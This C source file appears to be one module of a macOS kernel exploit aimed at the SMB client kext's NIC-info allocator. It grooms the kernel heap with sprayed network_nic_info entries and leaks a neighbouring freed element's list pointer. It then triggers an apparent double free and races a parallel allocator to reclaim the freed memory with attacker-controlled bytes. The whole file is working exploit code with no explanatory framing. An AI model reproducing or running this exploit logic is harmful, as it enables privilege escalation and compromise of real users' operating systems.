//
//  zfree_kext.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>

#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include "../smb/nic_allocator.h"
#include "../smb/client.h"

#include "zkext_free.h"
#include "allocator_rw.h"
#include "allocator_nic_parallel.h"
#include "zkext_neighbor_reader.h"
#include "platform_constants.h"
#include "util_misc.h"
#include "util_dispatch.h"
#include "util_log.h"


struct kmem_zkext_free_session {
    kmem_zkext_neighour_reader_t reader;
    smb_nic_allocator nic_allocator;
    kmem_allocator_nic_parallel_t capture_allocator;
    
    enum {
        STATE_CREATED,
        STATE_PREPARED,
        STATE_DONE
    } state;
    
    struct sockaddr_in smb_addr;
};


int kmem_zkext_free_kext_leak_nic(smb_nic_allocator allocator, kmem_zkext_neighour_reader_t neighbor_reader, const struct sockaddr_in* addr, struct complete_nic_info_entry* out) {
    
    smb_nic_allocator gap_allocator = smb_nic_allocator_create(addr, sizeof(*addr));
    
    int num_gaps = XE_PAGE_SIZE / 96 * 4;
    int num_elements_before_gap = 7;
    
    for (int gap_idx = 0; gap_idx < num_gaps; gap_idx++) {
        struct network_nic_info elements[num_elements_before_gap];
        bzero(elements, sizeof(elements));
        
        for (int element_idx = 0; element_idx < num_elements_before_gap; element_idx++) {
            struct network_nic_info* info = &elements[element_idx];
            info->nic_index = gap_idx * num_elements_before_gap + element_idx;
            info->addr_4.sin_len = sizeof(struct sockaddr_in);
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_addr.s_addr = info->nic_index;
            info->addr_4.sin_port = htons(1234);
            info->nic_link_speed = ((num_gaps * num_elements_before_gap) - info->nic_index);
            info->next_offset = sizeof(*info);
        }
        
        int error = smb_nic_allocator_allocate(allocator, elements, num_elements_before_gap, (uint32_t)sizeof(elements));
        assert(error == 0);
        
        struct network_nic_info gap;
        bzero(&gap, sizeof(gap));
        gap.nic_index = gap_idx;
        gap.addr_4.sin_family = AF_INET;
        gap.addr_4.sin_len = sizeof(struct sockaddr_in);
        gap.addr_4.sin_port = htons(4321);
        gap.addr_4.sin_addr.s_addr = gap_idx;
        
        error = smb_nic_allocator_allocate(gap_allocator, &gap, 1, sizeof(gap));
        assert(error == 0);
    }
    
    int error = smb_nic_allocator_destroy(&gap_allocator);
    assert(error == 0);
    
    char data[96];
    error = kmem_zkext_neighbor_reader_prepare_read_modified(neighbor_reader, data, sizeof(data));
    if (error) {
        return error;
    }
        
    struct complete_nic_info_entry* entry = (struct complete_nic_info_entry*)data;
    if (entry->nic_index > num_gaps * num_elements_before_gap || entry->next.prev == 0) {
        return EIO;
    }
    
    memcpy(out, data, sizeof(*out));
    return 0;
}


void kmem_zkext_free_kext_allocate_sockets(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t sin_len) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = XE_MIN(max_batch_size, count - done);
        struct network_nic_info infos[batch_size];
        bzero(infos, sizeof(infos));
        for (int sock_idx = 0; sock_idx < batch_size; sock_idx++) {
            struct network_nic_info* info = &infos[sock_idx];
            info->nic_index = nic_index;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = sin_len;
            info->addr_4.sin_port = htons(1234);
            info->addr_4.sin_addr.s_addr = (uint32_t)done + sock_idx;
            info->next_offset = sizeof(*info);
            info->nic_link_speed = UINT32_MAX;
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
        assert(error == 0);
        done += batch_size;
    }
}


void kmem_zkext_free_kext_reserve_nics(smb_nic_allocator allocator, size_t count) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = XE_MIN(max_batch_size, count - done);
        struct network_nic_info infos[batch_size];
        bzero(infos, sizeof(infos));
        for (int i = 0; i < batch_size; i++) {
            struct network_nic_info* info = &infos[i];
            info->nic_index = (uint32_t)done + i;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = sizeof(info->addr_4);
            info->next_offset = sizeof(*info);
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)sizeof(infos));
        assert(error == 0);
        done += batch_size;
    }
}


kmem_zkext_free_session_t kmem_zkext_free_session_create(const struct sockaddr_in* smb_addr) {
    kmem_zkext_free_session_t session = malloc(sizeof(struct kmem_zkext_free_session));
    session->reader = kmem_neighbor_reader_create();
    session->smb_addr = *smb_addr;
    session->nic_allocator = -1;
    session->capture_allocator = NULL;
    session->state = STATE_CREATED;
    return session;
}


struct complete_nic_info_entry kmem_zkext_free_session_prepare(kmem_zkext_free_session_t session) {
    assert(session->state == STATE_CREATED);
    
    smb_nic_allocator nic_allocator;
    struct complete_nic_info_entry entry;
    int tries = 10;
    do {
        XE_LOG_DEBUG("attempt to capture nic");
        nic_allocator = smb_nic_allocator_create(&session->smb_addr, sizeof(session->smb_addr));
        int error = kmem_zkext_free_kext_leak_nic(nic_allocator, session->reader, &session->smb_addr, &entry);
        if (error) {
            smb_nic_allocator_destroy(&nic_allocator);
            kmem_zkext_neighbor_reader_reset(session->reader);
        } else {
            break;
        }
    } while (tries--);
    
    assert(tries >= 0);
    assert(entry.next.prev != 0);
    
    session->nic_allocator = nic_allocator;
    session->state = STATE_PREPARED;
    return entry;
}


void kmem_zkext_free_session_execute(kmem_zkext_free_session_t session, const struct complete_nic_info_entry* entry) {
    assert(session->state == STATE_PREPARED);
    
    for (int i = 0; i < 50; i++) {
        XE_LOG_DEBUG("allocate sockets for nic %d / %d", i, 50);
        kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, INT32_MAX - i, 10000, sizeof(struct sockaddr_in));
    }

    kmem_zkext_free_kext_allocate_sockets(session->nic_allocator, (uint32_t)entry->nic_index, 512, 96);
    kmem_allocator_nic_parallel_t capture_allocator = kmem_allocator_nic_parallel_create(&session->smb_addr, 1024 * 320);

    dispatch_semaphore_t sem_dbf_trigger = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        struct network_nic_info info;
        bzero(&info, sizeof(info));
        info.nic_index = (uint32_t)entry->nic_index;
        int error = smb_nic_allocator_allocate(session->nic_allocator, &info, 1, sizeof(info));
        assert(error == ENOMEM);
        dispatch_semaphore_signal(sem_dbf_trigger);
    });
    
    kmem_allocator_nic_parallel_alloc(capture_allocator, ((char*)entry) + 8, 88);
    dispatch_semaphore_wait(sem_dbf_trigger, DISPATCH_TIME_FOREVER);
    
    session->capture_allocator = capture_allocator;
    session->state = STATE_DONE;
}


void kmem_zkext_free_session_destroy(kmem_zkext_free_session_t* session_p) {
    kmem_zkext_free_session_t session = *session_p;
    
    if (session->nic_allocator >= 0) {
        smb_nic_allocator_destroy(&session->nic_allocator);
    }
    
    if (session->capture_allocator) {
        kmem_allocator_nic_parallel_destroy(&session->capture_allocator);
    }
    
    kmem_zkext_neighbor_reader_destroy(&session->reader);
    free(session);
    *session_p = NULL;
}

